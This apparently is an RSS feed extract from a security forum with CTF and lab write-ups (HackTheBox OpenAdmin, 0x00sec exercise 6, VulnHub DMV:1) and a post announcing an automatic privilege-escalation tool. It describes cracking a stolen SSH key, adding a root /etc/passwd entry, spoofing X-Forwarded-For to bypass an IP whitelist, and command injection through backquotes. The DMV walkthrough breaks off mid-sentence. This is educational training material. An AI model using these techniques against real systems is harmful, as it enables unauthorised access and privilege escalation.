<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/0/e/0e9ac0e840a79f1c6b932199dc0bb57da3fd6e02.png" data-download-href="/uploads/short-url/25cf2gu7EFRbNCbJAPnx8rDTMPg.png?dl=1" title="internal http server" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/0/e/0e9ac0e840a79f1c6b932199dc0bb57da3fd6e02_2_690x179.png" alt="internal http server" data-base62-sha1="25cf2gu7EFRbNCbJAPnx8rDTMPg" width="690" height="179" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/0/e/0e9ac0e840a79f1c6b932199dc0bb57da3fd6e02_2_690x179.png, https://0x00sec.s3.amazonaws.com/optimized/3X/0/e/0e9ac0e840a79f1c6b932199dc0bb57da3fd6e02_2_1035x268.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/0/e/0e9ac0e840a79f1c6b932199dc0bb57da3fd6e02.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/0/e/0e9ac0e840a79f1c6b932199dc0bb57da3fd6e02_2_10x10.png"></a></div><p></p>
<p>basically <code>index.php</code> checks if the password is <code>jimmy</code> the the sha512 hash is equal to the hash shown in the picture, which is sha512 for the word “Revealed”</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/f/7/f7e672485a453ed2df8c02710674276e98e0f8f1.png" data-download-href="/uploads/short-url/zn1FbQgGTNV59mzeH9cMxQ3MHQZ.png?dl=1" title="internal appache index.php" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/f/7/f7e672485a453ed2df8c02710674276e98e0f8f1_2_690x93.png" alt="internal appache index.php" data-base62-sha1="zn1FbQgGTNV59mzeH9cMxQ3MHQZ" width="690" height="93" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/f/7/f7e672485a453ed2df8c02710674276e98e0f8f1_2_690x93.png, https://0x00sec.s3.amazonaws.com/optimized/3X/f/7/f7e672485a453ed2df8c02710674276e98e0f8f1_2_1035x139.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/f/7/f7e672485a453ed2df8c02710674276e98e0f8f1.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/f/7/f7e672485a453ed2df8c02710674276e98e0f8f1_2_10x10.png"></a></div><p></p>
<p>if this checks out it redirects the user to <code>main.php</code> which shows joanna’s private ssh key</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/f/1/f1bbf599f70ac124c35ebff48afe160e345cfa91.png" data-download-href="/uploads/short-url/yutLPCApK8dZJ1xOn8ucKq1FBAZ.png?dl=1" title="internal appache main.php" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/f/1/f1bbf599f70ac124c35ebff48afe160e345cfa91_2_690x149.png" alt="internal appache main.php" data-base62-sha1="yutLPCApK8dZJ1xOn8ucKq1FBAZ" width="690" height="149" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/f/1/f1bbf599f70ac124c35ebff48afe160e345cfa91_2_690x149.png, https://0x00sec.s3.amazonaws.com/optimized/3X/f/1/f1bbf599f70ac124c35ebff48afe160e345cfa91_2_1035x223.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/f/1/f1bbf599f70ac124c35ebff48afe160e345cfa91.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/f/1/f1bbf599f70ac124c35ebff48afe160e345cfa91_2_10x10.png"></a></div><p></p>
<p>I just called <code>main.php</code> directly with curl and got the key</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/c/f/cff63e7fdaf4334d2f002f6bc83737084909ef23.png" data-download-href="/uploads/short-url/tFIpxN2aanH1g98eIzOqL7h7ZuP.png?dl=1" title="joanna ssh private key" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/c/f/cff63e7fdaf4334d2f002f6bc83737084909ef23_2_690x357.png" alt="joanna ssh private key" data-base62-sha1="tFIpxN2aanH1g98eIzOqL7h7ZuP" width="690" height="357" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/c/f/cff63e7fdaf4334d2f002f6bc83737084909ef23_2_690x357.png, https://0x00sec.s3.amazonaws.com/optimized/3X/c/f/cff63e7fdaf4334d2f002f6bc83737084909ef23_2_1035x535.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/c/f/cff63e7fdaf4334d2f002f6bc83737084909ef23.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/c/f/cff63e7fdaf4334d2f002f6bc83737084909ef23_2_10x10.png"></a></div><p></p>
<p>I cracked the ssh key with john and rockyou.txt, and logged in</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/b/3/b39c597180f11343422d839eddb36be9b9bf9ab1.png" data-download-href="/uploads/short-url/pCUrxCmEGIidXXMUTYgzwTCcPu1.png?dl=1" title="cracking joanna ssh keys" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/b/3/b39c597180f11343422d839eddb36be9b9bf9ab1_2_690x205.png" alt="cracking joanna ssh keys" data-base62-sha1="pCUrxCmEGIidXXMUTYgzwTCcPu1" width="690" height="205" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/b/3/b39c597180f11343422d839eddb36be9b9bf9ab1_2_690x205.png, https://0x00sec.s3.amazonaws.com/optimized/3X/b/3/b39c597180f11343422d839eddb36be9b9bf9ab1_2_1035x307.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/b/3/b39c597180f11343422d839eddb36be9b9bf9ab1.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/b/3/b39c597180f11343422d839eddb36be9b9bf9ab1_2_10x10.png"></a></div><p></p>
<h1>
<a name="joanna-5" class="anchor" href="https://0x00sec.org#joanna-5"></a>joanna</h1>
<p>once I’m was in, I found that I can edit a file with sudo privileges</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/4/a/4ab10d3264b89b0af2dd4074146d9db0976a2256.png" data-download-href="/uploads/short-url/aEKFasbM6ZjyMRix0s5Ymfj4SMK.png?dl=1" title="sudo -l" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/4/a/4ab10d3264b89b0af2dd4074146d9db0976a2256_2_690x119.png" alt="sudo -l" data-base62-sha1="aEKFasbM6ZjyMRix0s5Ymfj4SMK" width="690" height="119" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/4/a/4ab10d3264b89b0af2dd4074146d9db0976a2256_2_690x119.png, https://0x00sec.s3.amazonaws.com/optimized/3X/4/a/4ab10d3264b89b0af2dd4074146d9db0976a2256_2_1035x178.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/4/a/4ab10d3264b89b0af2dd4074146d9db0976a2256.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/4/a/4ab10d3264b89b0af2dd4074146d9db0976a2256_2_10x10.png"></a></div><p></p>
<p>I always have a custom <code>/etc/passwd</code> entry generated with <code>mkpasswd -m sha-512 PASSWORD -s SALT</code> for situations like this, all I have to do is to put it in there</p>
<p>I just pressed CTRL-L to load the content of <code>/etc/passwd</code>, put my entry as the user jeff and gave it a uid of 0, so I can have the same privileges as the root user, the file the file looked like this in the end</p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/b/7/b7691857f8bd416f3a551fb4aa83a1fdbdc79096.png" data-download-href="/uploads/short-url/qawxCyFrCiVSn35sTq3ck2iajbg.png?dl=1" title="making a custom /etc/passwd entry" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/original/3X/b/7/b7691857f8bd416f3a551fb4aa83a1fdbdc79096.png" alt="making a custom /etc/passwd entry" data-base62-sha1="qawxCyFrCiVSn35sTq3ck2iajbg" width="690" height="388" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/b/7/b7691857f8bd416f3a551fb4aa83a1fdbdc79096_2_10x10.png"></a></div><p></p>
<p>then I just overwrote /etc/passwd with the new cotent and logged in as jeff <img src="https://0x00sec.org/images/emoji/twitter/slight_smile.png?v=9" title=":slight_smile:" class="emoji" alt=":slight_smile:"></p>
<p></p><div class="lightbox-wrapper"><a class="lightbox" href="https://0x00sec.s3.amazonaws.com/original/3X/2/3/236f3ae81a8a8011ea6f447c1f76ccb4c660dd8d.png" data-download-href="/uploads/short-url/53t1icEbBE7HkN9NdkLpoI01u4B.png?dl=1" title="logging in as jeff" rel="noopener nofollow ugc"><img src="https://0x00sec.s3.amazonaws.com/optimized/3X/2/3/236f3ae81a8a8011ea6f447c1f76ccb4c660dd8d_2_690x74.png" alt="logging in as jeff" data-base62-sha1="53t1icEbBE7HkN9NdkLpoI01u4B" width="690" height="74" srcset="https://0x00sec.s3.amazonaws.com/optimized/3X/2/3/236f3ae81a8a8011ea6f447c1f76ccb4c660dd8d_2_690x74.png, https://0x00sec.s3.amazonaws.com/optimized/3X/2/3/236f3ae81a8a8011ea6f447c1f76ccb4c660dd8d_2_1035x111.png 1.5x, https://0x00sec.s3.amazonaws.com/original/3X/2/3/236f3ae81a8a8011ea6f447c1f76ccb4c660dd8d.png 2x" data-small-upload="https://0x00sec.s3.amazonaws.com/optimized/3X/2/3/236f3ae81a8a8011ea6f447c1f76ccb4c660dd8d_2_10x10.png"></a></div><p></p>
            <p><small>15 posts - 8 participants</small></p>
            <p><a href="https://0x00sec.org/t/hackthebox-openadmin-writeup/26519">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/hackthebox-openadmin-writeup/26519</link>
          <pubDate>Fri, 09 Jul 2021 16:21:02 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-26519</guid>
          <source url="https://0x00sec.org/t/hackthebox-openadmin-writeup/26519.rss">Hackthebox : openadmin writeup</source>
        </item>
        <item>
          <title>GTFONow - Automatic privilege escalation for misconfigured capabilities, sudo and suid binaries</title>
          <dc:creator><![CDATA[frissi0n]]></dc:creator>
          <category>CTF</category>
          <description><![CDATA[
            <p>Hi 0x00Sec</p>
<p>In the past I have just lurked here, but now I have something of interest to post, I thought I would finally signup.</p>
<p>I’m sharing a new tool I’ve created called <a href="https://github.com/Frissi0n/GTFONow" rel="noopener nofollow ugc">GTFONow</a>, its used for automatic privilege escalation by abusing misconfigured unix capabilities, sudo and suid binaries.</p>
<p>It is intended for CTFs, but could work on pentests too, however it can be quite noisy so its not recommended if you are aiming to be stealthy.</p>
<p>Currently it has the following features:</p>
<ul>
<li>Automatically escalate privileges using misconfigured sudo permissions.</li>
<li>Automatically escalate privileges using misconfigured suid permissions.</li>
<li>Automatically escalated privileges using misconfigured capabilities.</li>
<li>Supports Python 2 and 3.</li>
<li>No third party libraries required.</li>
<li>Support sudo <code>PASSWD</code> and <code>NOPASSWD</code> escalation, automatically attempts to enumerate sudo binaries for when password is not known and <code>sudo -l</code> is not accessible.</li>
</ul>
<h2>Usage Examples</h2>
<h3>Default Mode - Scan All</h3>
<p><a href="https://asciinema.org/a/CyEH3GyAFyWtIVjngWpa0hDBk" rel="noopener nofollow ugc"><img src="https://asciinema.org/a/CyEH3GyAFyWtIVjngWpa0hDBk.svg" alt="asciicast" width="459" height="500"></a></p>
<h3>Capability Escalation</h3>
<p><a href="https://asciinema.org/a/nmrMirrKNRrb7XHhVRYD66tWa" rel="noopener nofollow ugc"><img src="https://asciinema.org/a/nmrMirrKNRrb7XHhVRYD66tWa.svg" alt="asciicast" width="459" height="500"></a></p>
<h3>Sudo Escalation and Verbose Mode</h3>
<p><a href="https://asciinema.org/a/HdpWGxGAIAMahoJD6eoB6pqNq" rel="noopener nofollow ugc"><img src="https://asciinema.org/a/HdpWGxGAIAMahoJD6eoB6pqNq.svg" alt="asciicast" width="459" height="500"></a></p>
            <p><small>5 posts - 5 participants</small></p>
            <p><a href="https://0x00sec.org/t/gtfonow-automatic-privilege-escalation-for-misconfigured-capabilities-sudo-and-suid-binaries/24634">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/gtfonow-automatic-privilege-escalation-for-misconfigured-capabilities-sudo-and-suid-binaries/24634</link>
          <pubDate>Tue, 19 Jan 2021 00:03:45 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-24634</guid>
          <source url="https://0x00sec.org/t/gtfonow-automatic-privilege-escalation-for-misconfigured-capabilities-sudo-and-suid-binaries/24634.rss">GTFONow - Automatic privilege escalation for misconfigured capabilities, sudo and suid binaries</source>
        </item>
        <item>
          <title>Writeup: 0x00sec CTF - Exercise #6</title>
          <dc:creator><![CDATA[H45uK1mchi]]></dc:creator>
          <category>CTF</category>
          <description><![CDATA[
            <p><span alt="header-ctf-0x00sec" data-base62-sha1="wOiVhJMMswDlMlkqZB8w6ZTLfjQ" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<h1>Writeup CTF 0x00sec Web - Exercise <span class="hashtag">#6</span>
</h1>
<p>Another day, another ctf challenge. This time we try no. 6.</p>
<h2>The Challenge</h2>
<p>This time, if we visit the page we are welcomed with an error message. That our IP is not on the whitelist. However, let’s start like we always do:</p>
<p>By inspecting the source code of the page.</p>
<p><span alt="01-source" data-base62-sha1="mmITJ8VT7HmbyEi79Hx2gHFpjDU" class="broken-image" title="This image is broken"><svg class="fa d-icon d-icon-unlink svg-icon" aria-hidden="true"><use xlink:href="#unlink"></use></svg></span></p>
<p>And we instantly find our hint:</p>
<pre><code class="lang-auto">
&lt;!-- TODO: --&gt;

&lt;!-- * Test IP whitelisting security --&gt;

</code></pre>
<h2>The Attack</h2>
<p>Well, we know that there is an IP Whitelisting in place. And that it might be flawed. But to be honest, I had no idea how to bypass this.</p>
<p>My initial idea was to abuse exercise 5 for this. As we know that it had an SSRF we could try to access the page of exercise 6 with it. But that sadly did not work out.</p>
<p>But Google is your friend and after googling for _ ip whitelisting bypass_ I found a nice article: <a href="https://www.sjoerdlangkemper.nl/2017/03/01/bypass-ip-block-with-x-forwarded-for-header/" rel="nofollow noopener">https://www.sjoerdlangkemper.nl/2017/03/01/bypass-ip-block-with-x-forwarded-for-header/</a></p>
<p>That sounds nice. So our target is the <a href="https://en.wikipedia.org/wiki/X-Forwarded-For" rel="nofollow noopener">X-Forwareded-For</a> header.</p>
<p>And as <code>127.0.0.1</code> should never be blocked we have our exploit. So let’s curl the page and add the header with <code>-H</code></p>
<pre><code class="lang-auto">
curl -H "X-Forwarded-For: 127.0.0.1" https://exercise-6.0x00sec.dev/

</code></pre>
<p>And we see the page content and the flag!</p>
<h2>Conclusion</h2>
<p>Never give up against a firewall.</p>
<ul>
<li><a href="https://hackerone.com/reports/44513" rel="nofollow noopener">https://hackerone.com/reports/44513</a></li>
</ul>
            <p><small>2 posts - 1 participant</small></p>
            <p><a href="https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-6/20987">Read full topic</a></p>
          ]]></description>
          <link>https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-6/20987</link>
          <pubDate>Mon, 04 May 2020 09:56:32 +0000</pubDate>
          <discourse:topicPinned>No</discourse:topicPinned>
          <discourse:topicClosed>Yes</discourse:topicClosed>
          <discourse:topicArchived>No</discourse:topicArchived>
          <guid isPermaLink="false">0x00sec.org-topic-20987</guid>
          <source url="https://0x00sec.org/t/writeup-0x00sec-ctf-exercise-6/20987.rss">Writeup: 0x00sec CTF - Exercise #6</source>
        </item>
        <item>
          <title>(VulnHub) [DMV: 1] WriteUp — Walkthrough</title>
          <dc:creator><![CDATA[DamaneDz]]></dc:creator>
          <category>CTF</category>
          <description><![CDATA[
            <p>Original WriteUp:<br>
</p><aside class="onebox allowlistedgeneric">
  <header class="source">
      <img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8c7390150cd0078e967a18c7663581b9b334d239.png" class="site-icon" width="" height="">
      <a href="https://medium.com/@DamaneDz/vulnhub-dmv-1-writeup-walkthrough-c1e12e6659f9" target="_blank" rel="noopener nofollow ugc" title="05:10PM - 09 September 2020">Medium – 9 Sep 20</a>
  </header>
  <article class="onebox-body">
    <img src="https://0x00sec.s3.amazonaws.com/original/2X/b/b26c4d1b44b90d4c0e5b0d56a9485c5b44b53321.png" class="thumbnail" width="" height="">

<h3><a href="https://medium.com/@DamaneDz/vulnhub-dmv-1-writeup-walkthrough-c1e12e6659f9" target="_blank" rel="noopener nofollow ugc">(VulnHub) [DMV: 1] WriteUp — Walkthrough</a></h3>

<p>VulnHub Link: https://www.vulnhub.com/entry/dmv-1,462/</p>

  <p><span class="label1">Reading time: 9 min read</span>
    </p>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>
<p></p>
<p>VulnHub Link: <a href="https://www.vulnhub.com/entry/dmv-1,462/" rel="noopener nofollow ugc">https://www.vulnhub.com/entry/dmv-1,462/</a></p>
<p>Description:</p>
<p>It is a simple machine that replicates a real scenario that I found.The goal is to get two flags, one that is in the secret folder and the other that can only be read by the root userThis works better with VirtualBox rather than VMware.</p>
<p>The VirtualBox IP: 192.168.56.101</p>
<p>So as a start and as always a quick nmap scan:</p>
<blockquote>
<p>nmap -sC -sV 192.168.56.101<br>
Starting Nmap 7.80 ( <a href="https://nmap.org" rel="noopener nofollow ugc">https://nmap.org</a> ) at 2020-04-16 16:25 GMT Daylight Time<br>
Nmap scan report for 192.168.56.101<br>
Host is up (0.00022s latency).<br>
Not shown: 998 closed ports<br>
PORT STATE SERVICE VERSION<br>
22/tcp open ssh OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)<br>
| ssh-hostkey:<br>
| 2048 65:1b:fc:74:10:39:df:dd:d0:2d:f0:53:1c:eb:6d:ec (RSA)<br>
| 256 c4:28:04:a5:c3:b9:6a:95:5a:4d:7a:6e:46:e2:14:db (ECDSA)<br>
|_ 256 ba:07:bb:cd:42:4a:f2:93:d1:05:d0:b3:4c:b1:d9:b1 (ED25519)<br>
80/tcp open http Apache httpd 2.4.29 ((Ubuntu))<br>
|_http-server-header: Apache/2.4.29 (Ubuntu)<br>
|_http-title: Site doesn’t have a title (text/html; charset=UTF-8).<br>
MAC Address: 08:00:27:28:AD:53 (Oracle VirtualBox virtual NIC)<br>
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernelService detection performed. Please report any incorrect results at <a href="https://nmap.org/submit/" rel="noopener nofollow ugc">https://nmap.org/submit/</a> .<br>
Nmap done: 1 IP address (1 host up) scanned in 13.34 seconds</p>
</blockquote>
<p>We have only 2 opened ports !</p>
<p>22 (ssh) ==&gt;OpenSSH 7.6p1</p>
<p>80 (http) ==&gt; Apache httpd 2.4.29</p>
<p>and the nmap log show us that we are in a Ubuntu server</p>
<p>Let’s see what we have on port 80 (the web page)</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/238594495e98dc3c703ce7349106fb37534b6381.png" alt="" data-base62-sha1="54eU1JAd3ejVEkaQhEBwjZQEmkN" width="690" height="326"></p>
<p>We have some kind of YouTube to MP3 converter !</p>
<p>let’s try to put something in the video ID and intercept the request using BurpSuite</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2f288cc39874701bcac2e4b79213a8f3876f4025.png" alt="" data-base62-sha1="6JbjLph91aCw5NH7UIAnxpoyCTH" width="544" height="426"></p>
<p>and the sent request from burpsuite:</p>
<p>POST / HTTP/1.1<br>
Host: 192.168.56.101<br>
User-Agent: Mozilla/5.0 (Windows NT 10.0; WOW64; rv:56.0) Gecko/20100101 Firefox/56.0<br>
Accept: <em>/</em><br>
Accept-Language: en-US,en;q=0.5<br>
Content-Type: application/x-www-form-urlencoded; charset=UTF-8<br>
X-Requested-With: XMLHttpRequest<br>
Referer: <a href="http://192.168.56.101/" rel="noopener nofollow ugc">http://192.168.56.101/</a><br>
Content-Length: 57<br>
DNT: 1<br>
Connection: close <strong>yt_url=https%3A%2F%<a href="http://2Fwww.youtube.com" rel="noopener nofollow ugc">2Fwww.youtube.com</a>%2Fwatch%3Fv%3D123456</strong></p>
<p>and The response was:</p>
<p>HTTP/1.1 200 OK<br>
Date: Thu, 16 Apr 2020 15:28:06 GMT<br>
Server: Apache/2.4.29 (Ubuntu)<br>
Vary: Accept-Encoding<br>
Content-Length: 392<br>
Connection: close<br>
Content-Type: text/html; charset=UTF-8{“status”:1,“errors”:“WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nERROR: Incomplete YouTube ID 123456. URL <a href="https://www.youtube.com/watch?v=" rel="noopener nofollow ugc">https://www.youtube.com/watch?v=</a> <strong>123456</strong> looks truncated.\n”,“url_orginal”:" <strong><a href="https://www.youtube.com/watch?v=123456" rel="noopener nofollow ugc">https://www.youtube.com/watch?v=123456</a></strong> “,“output”:”",“result_url”:"/tmp/downloads/5e9879861935f.mp3"}</p>
<p>So we have a post request that takes the ID we put and add it to “<a href="https://www.youtube.com/watch?v" rel="noopener nofollow ugc">https://www.youtube.com/watch?v</a>"</p>
<p>It looks from the request “yt_url” that we can change the YouTube URL with something else !</p>
<p>before that we have in response somehow an error ! let’s google this and see what we have</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/c/cb80c301577be89e527c63dc10a714ade0701490.png" alt="" data-base62-sha1="t2gNqEdQopSIziYwlx15RnmhD0Y" width="690" height="446"></p>
<p>So the website is using a python tool that allows you to convert and download youtube videos to MP3</p>
<p>and I quote from the <a href="https://github.com/ytdl-org/youtube-dl" rel="noopener nofollow ugc">github</a> link</p>
<p>Command-line program to download videos from <a href="http://YouTube.com" rel="noopener nofollow ugc">YouTube.com</a> and other video sites</p>
<p>before then I start anything I had to check the commands list of this program (youtube-dl)</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/564db84a25105fddde205394f9addb862feb7226.png" alt="" data-base62-sha1="cjtzKcMHc9DXElDEbahbF9KvHRs" width="690" height="450"></p>
<p>So let’s try via BurpSuite repeater to print the version info (“ — version” as shown below)</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/d/de7cbe7373185e26476a5ca5a75021d3039c1b73.png" alt="" data-base62-sha1="vKdgbJKtjyTKTYV0d8VnkAI66Iz" width="690" height="344"></p>
<p>So the version was printed without errors and the program is using the version 2020.03.24 ( not that old )</p>
<p>So from the commits let’s check what we have in this version and specially looking for any bugs !</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/a/a1c2cb47f1df042fb85e65634d8fbf6710bc152e.png" alt="" data-base62-sha1="n50dsydKlmnmuJ422cKunCbyEsC" width="690" height="297"></p>
<p>And if you want to look for bugs (I mean generally in github) don’t search on commits of the current version but you have to check recent ones …</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/8/8c35f8eaca1ec6975b17233a8110caa96c01dc62.png" alt="" data-base62-sha1="k0mtPacsCPbxEBBNO50YoEKzIga" width="690" height="369"></p>
<p>As you notice we have the Mar 23,2020 and the Apr 5, 2020 and more … The last one is on Apr 11, 2020</p>
<p>You can check manually <a href="https://github.com/ytdl-org/youtube-dl/commits/master" rel="noopener nofollow ugc">https://github.com/ytdl-org/youtube-dl/commits/master</a></p>
<p>nothing looks suspicious just some random updates and fixes …</p>
<p>(I hope everything above is clear to now !)</p>
<p>So let’s go back to the command list and see if we can somehow execute commands on system !</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4e5e83b12cb7565f90745acb3e0a7b22f074df08.png" alt="" data-base62-sha1="bbhJOn7fuQB1TYgWj0kfrw6CqOk" width="690" height="322"></p>
<p>So let’s go back to our Burpsuite repeater and try this with changing the command to whoami</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/4/4bf108a54b8b19ecdbd250eb2269c0622f630623.png" alt="" data-base62-sha1="aPOdOhHagzNKrVhI7zc6sLketMv" width="690" height="386"></p>
<p>Nothing ! but something isn’t normal if you take a look at the url_original value in the response you won’t see</p>
<p>the ‘whoami’ maybe it’s restricting some commands or maybe it takes only what before the space ? let’s URL Encode that and try (the space in URL Encode is +)</p>
<p>nothing too ! still not showing the whoami let’s write whoami without the — exec and without single quotes</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/5ee81bf015a78fb1b280defca214bca371b1df18.png" alt="" data-base62-sha1="dxAaLS91kcmWxQCzoVLWvXWb3CM" width="690" height="90"></p>
<p>so the problem isn’t in whoami let’s write it with single quotes</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/7/7e781e098ebd8080e07f920f35c104fa75228d62.png" alt="" data-base62-sha1="i2NvI78GpwmzmzdYZOeQhqcAeau" width="690" height="64"></p>
<p>Now am 100% sure that the problem is in spaces cause I tried also to send more than 20 characters here is an example</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/256d2c150a4255a0948f2beb3588c00a0c3d8660.png" alt="" data-base62-sha1="5l5z8ChgdhB3aub216Kxqy1OHio" width="690" height="58"></p>
<p>So for a quick and smart scan let’s send this over Intruder using special characters list …</p>
<aside class="onebox githubblob">
  <header class="source">
      <a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/special-chars.txt" target="_blank" rel="noopener nofollow ugc">github.com</a>
  </header>
  <article class="onebox-body">
    <h4><a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/special-chars.txt" target="_blank" rel="noopener nofollow ugc">danielmiessler/SecLists/blob/master/Fuzzing/special-chars.txt</a></h4>
<pre><code class="lang-txt">~
!
@
#
$
%
^
&amp;
*
(
)
_
_
+
=
{
}
]
[
|
</code></pre>

  This file has been truncated. <a href="https://github.com/danielmiessler/SecLists/blob/master/Fuzzing/special-chars.txt" target="_blank" rel="noopener nofollow ugc">show original</a>

  </article>
  <div class="onebox-metadata">
    
    
  </div>
  <div style="clear: both"></div>
</aside>

<p>The images below will explain how to use the Intruder in BurpSuite</p>
<ol>
<li>Configure the position of where you want the payloads will be inserted (write anything and select it and click on Add)</li>
</ol>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/5/54e47dc115adf26fd3662f2f9f5d58c59e679ca6.png" alt="" data-base62-sha1="c6ZE9OAGL6tCfN4icLdAKPeYeCq" width="690" height="368"></p>
<ol start="2">
<li>Copy the special characters list and paste it here (The Payload Section)</li>
</ol>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2da7185298400aee5156d79e20afa0aa745c10ea.png" alt="" data-base62-sha1="6vRu6yZSpjlVB8lKWC6A7ib1KJA" width="690" height="368"></p>
<p>Now Click on Start Attack, To compare between the sent requests we should take a look at length case</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/2/2cdaa7077bd2bd5680d74cac7b0a69cfca2cf54b.png" alt="" data-base62-sha1="6oNt6up2CGDhKThupce5E4sR7NV" width="690" height="495"></p>
<p>As you see many different values let’s eliminate the 564 ones cause they had the same error message which is</p>
<p>{“status”:1,“errors”:“WARNING: Assuming --restrict-filenames since file system encoding cannot encode all characters. Set the LC_ALL environment variable to fix this.\nERROR: u’!’ is not a valid URL. Set --default-search “ytsearch” (or run youtube-dl “ytsearch:!” ) to search YouTube\n”,“url_orginal”:"!",“output”:"",“result_url”:"/tmp/downloads/5e9881edeff6e.mp3"}</p>
<p>but the special cases having this</p>
<p>{“status”:2,“errors”:" <strong>sh: 1:</strong> cannot open -f: No such file\n",“url_orginal”:"&lt;",“output”:"",“result_url”:"/tmp/downloads/5e98820f668c1.mp3"}</p>
<p>something is saying “ sh “ <img src="https://0x00sec.org/images/emoji/twitter/smiley.png?v=9" title=":smiley:" class="emoji" alt=":smiley:"> let’s go back to out Intruder and to the options tab</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/e/ef360cf5f26b878356d582a3014eebe8cef82b38.png" alt="" data-base62-sha1="y89UWe6eDHgAYAWm8PxGPMkFRvG" width="436" height="500"></p>
<p>In the Grep — Match section clear all the values and add sh: 1 or just sh: and go back to the results tab</p>
<p><img src="https://0x00sec.s3.amazonaws.com/original/2X/f/f2e7345673d161d9bed8dd499adec92f0ce2a996.png" alt="" data-base62-sha1="yEOTRLXCfi4I1KntvIYuyagsojY" width="690" height="218"></p>
<p>No we reduce the results to only 9 characters that bypass the program and lead us to use the sh/bash commands …</p>
<p>In the request we have the backquote or the grave accent</p>
<p>If you don’t know what backquote does read this:</p>
<p>When the old-style backquote form of substitution is used, backslash<br>
retains its literal meaning except when followed by $, `, or . The<br>
first backquote not preceded by a backslash terminates the command sub‐<br>
stitution. When using the $(command) form, all characters between the<br>
parentheses make up the command; none are treated specially.Command substitutions may be nested. To nest when using the backquoted<br>
form, escape the inner backquotes with backslashes.</p>
<p>So to make things easier for you guys here is our new payload list</p>
<p>&amp;<br>
(<br>
)<br>
|<br>
`<br>
’<br>
"<br>
&lt;<br>
;</p>
<p>Let’s run another intruder but this time let’s include a command with backquote <code>id</code></p>
<p>and the command was executed successfully but isn’t showing all the command return !</p>
<p>So if you go down to the response of the other payloads we only one that print everything</p>
